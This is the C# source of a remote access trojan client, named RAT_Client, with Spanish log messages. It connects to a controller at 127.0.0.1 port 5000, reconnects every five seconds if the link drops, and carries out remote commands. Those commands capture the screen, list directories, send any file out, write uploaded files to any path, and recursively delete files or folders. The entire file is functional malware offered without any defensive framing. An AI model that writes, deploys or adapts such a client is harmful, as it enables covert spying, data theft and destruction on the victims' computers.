using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace RAT_Client
{
    static class Program
    {
        static void Main()
        {
            while (true)
            {
                try
                {
                    var client = new TcpClient();
                    client.Connect("127.0.0.1", 5000);

                    Console.WriteLine("Conectado al servidor.");

                    using (var stream = client.GetStream())
                    using (var writer = new StreamWriter(stream))
                    using (var reader = new StreamReader(stream))
                    {
                        var pcName = Environment.MachineName;
                        writer.WriteLine(pcName);
                        writer.Flush();

                        while (true)
                        {
                            var command = reader.ReadLine();
                            if (command == null) break;

                            if (command == "GET_SCREEN")
                            {
                                SendScreen(stream);
                            }
                            else if (command.StartsWith("LIST|"))
                            {
                                SendList(writer, command.Substring(5));
                            }
                            else if (command.StartsWith("DOWNLOAD|"))
                            {
                                SendFile(stream, writer, command.Substring(9));
                            }
                            else if (command.StartsWith("UPLOAD|"))
                            {
                                ReceiveFile(stream, writer, command);
                            }
                            else if (command.StartsWith("DELETE|"))
                            {
                                DeletePath(writer, command.Substring(7));
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}. Reintentando en 5 segundos...");
                    Thread.Sleep(5000);
                }
            }
        }

        private static void SendScreen(NetworkStream stream)
        {
            try
            {
                var screen = CaptureScreen();

                using (var memoryStream = new MemoryStream())
                {
                    screen.Save(memoryStream, ImageFormat.Jpeg);
                    var buffer = memoryStream.ToArray();

                    var length = BitConverter.GetBytes(buffer.Length);
                    stream.Write(length, 0, length.Length); // Enviar tamaño de la imagen
                    stream.Write(buffer, 0, buffer.Length); // Enviar la imagen
                    stream.Flush();
                }
            }
            catch (IOException)
            {
                Console.WriteLine("Conexión perdida al enviar la pantalla.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al enviar la pantalla: {ex.Message}");
            }
        }

        private static Bitmap CaptureScreen()
        {
            var bounds = Screen.PrimaryScreen.Bounds;
            var bitmap = new Bitmap(bounds.Width, bounds.Height);

            using (var g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            return bitmap;
        }

        private static void SendList(StreamWriter writer, string path)
        {
            try
            {
                var dirs = string.Join(";", Directory.GetDirectories(path));
                var files = string.Join(";", Directory.GetFiles(path));
                writer.WriteLine($"{dirs}|{files}");
                writer.Flush();
            }
            catch (Exception ex)
            {
                writer.WriteLine($"ERROR:{ex.Message}");
                writer.Flush();
            }
        }

        private static void SendFile(NetworkStream stream, StreamWriter writer, string path)
        {
            try
            {
                var buffer = File.ReadAllBytes(path);
                writer.WriteLine(buffer.Length.ToString());
                writer.Flush();
                stream.Write(buffer, 0, buffer.Length);
            }
            catch (Exception ex)
            {
                writer.WriteLine($"ERROR:{ex.Message}");
                writer.Flush();
            }
        }

        private static void ReceiveFile(NetworkStream stream, StreamWriter writer, string command)
        {
            try
            {
                var parts = command.Split('|');
                if (parts.Length != 3 || !int.TryParse(parts[2], out int size))
                {
                    writer.WriteLine("ERROR:INVALID_UPLOAD_COMMAND");
                    writer.Flush();
                    return;
                }

                var buffer = new byte[size];
                int read = 0;
                while (read < size)
                {
                    int r = stream.Read(buffer, read, size - read);
                    if (r <= 0) break;
                    read += r;
                }
                File.WriteAllBytes(parts[1], buffer);
                writer.WriteLine("OK");
                writer.Flush();
            }
            catch (Exception ex)
            {
                writer.WriteLine($"ERROR:{ex.Message}");
                writer.Flush();
            }
        }

        private static void DeletePath(StreamWriter writer, string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                }
                else if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                }
                writer.WriteLine("OK");
                writer.Flush();
            }
            catch (Exception ex)
            {
                writer.WriteLine($"ERROR:{ex.Message}");
                writer.Flush();
            }
        }
    }
}
